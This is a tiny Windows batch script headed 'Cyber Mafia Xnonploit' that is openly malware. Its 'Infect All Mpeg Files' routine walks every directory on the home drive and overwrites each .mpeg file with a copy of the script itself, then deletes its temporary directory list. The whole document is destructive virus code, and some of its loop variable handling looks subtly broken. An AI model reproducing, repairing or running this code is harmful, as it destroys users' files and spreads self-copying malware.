:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
::---Infect All Mpeg Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.mpeg) Do (
            Set MpegInfect=%%Z > Nul
            Copy /y %0 %MpegInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
